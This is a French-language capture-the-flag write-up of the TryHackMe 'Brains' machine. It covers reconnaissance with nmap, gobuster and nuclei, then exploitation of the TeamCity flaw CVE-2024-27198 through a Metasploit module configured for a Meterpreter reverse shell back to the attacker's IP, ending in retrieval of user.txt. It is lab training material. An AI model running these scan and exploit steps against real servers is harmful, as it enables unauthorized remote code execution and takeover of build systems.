# 📌 Write-Up : Machine Brains - TryHackMe 🧠

## 📝 Informations Générales

- **Nom de la machine** : Brains
- **Difficulté** : Moyenne
- **Type d'attaque** : Exploitation Web & Prise de contrôle via RCE (TeamCity)
- **Adresse IP** : `10.10.165.8`
- **Outils** : Nmap, Metasploit, Nuclei, Gobuster

---

## 🔍 Scan et Reconnaissance

### 📌 Scan Nmap

Commande utilisée :
```bash
sudo nmap -sS -O -Pn 10.10.165.8
```
📌 **Résultats** :
- **IP cible** : `10.10.165.8`
- **Ports ouverts** :
  - `22/tcp` → OpenSSH 8.2p1 (Ubuntu 4ubuntu0.11)
  - `80/tcp` → Apache 2.4.41 (Ubuntu)
  - `50000/tcp` → Apache Tomcat (TeamCity)
- **OS détecté** : Linux 4.15

### 📌 Analyse Web (Port 80)

Accès au site : `http://10.10.165.8/`

- Page en **maintenance**.
- Utilisation de **Gobuster** :
  ```bash
  gobuster dir -u http://10.10.165.8 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
  ```
  📌 **Résultat intéressant** : `/index.php` trouvé.

### 📌 Analyse du Port 50000 (TeamCity)

Accès à l'interface TeamCity :
L'accès à l'interface se fait grâce aux différents indices trouvés dans le nmap.

```
http://10.10.165.8:50000/login.html
```
📌 **Détails** :
- Champs disponibles : **Username, Password, Reset Password, Login**
- **Version TeamCity** : 2023.11.3 (build 147512)

### 📌 Recherche de Vulnérabilités

J'ai utilisé **Nuclei** pour scanner les vulnérabilités connues :
```bash
nuclei -u http://10.10.165.8:50000 -t cves/
```
📌 **Résultat intéressant** :
- **CVE-2024-27198** (Remote Code Execution sur TeamCity)

---

## 🔒 Exploitation et Accès Initial

### 📌 Exploitation de CVE-2024-27198

J'ai utilisé **Metasploit** pour exploiter la vulnérabilité et obtenir un shell.

📌 **Commande utilisée** :
```bash
use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198
set rhosts 10.10.165.8
set lhost <ton_ip>
set lport 66
set rport 50000
check
run
```
📌 **Résultat** :
- **Le serveur est vulnérable** (JetBrains TeamCity 2023.11.3 - Linux).
- **Exploitation réussie avec un reverse shell Meterpreter.**
- **L'utilisateur obtenu est `ubuntu`.**

### 📌 Récupération du fichier `user.txt`

Une fois dans le shell **Meterpreter**, j'ai navigué vers le dossier utilisateur pour localiser le flag :
```bash
cd /home/ubuntu
ls
cat user.txt
```
📌 **Résultat** : Le flag **user.txt** a été trouvé et récupéré avec succès.

---

## 🚀 Prochaines Étapes la partie 2 avec Splunk

Pour cette partie 2, je vous suggère de tenter de l'effectuer seul, c'est un travail de 'forensic' assez basic et amusant.

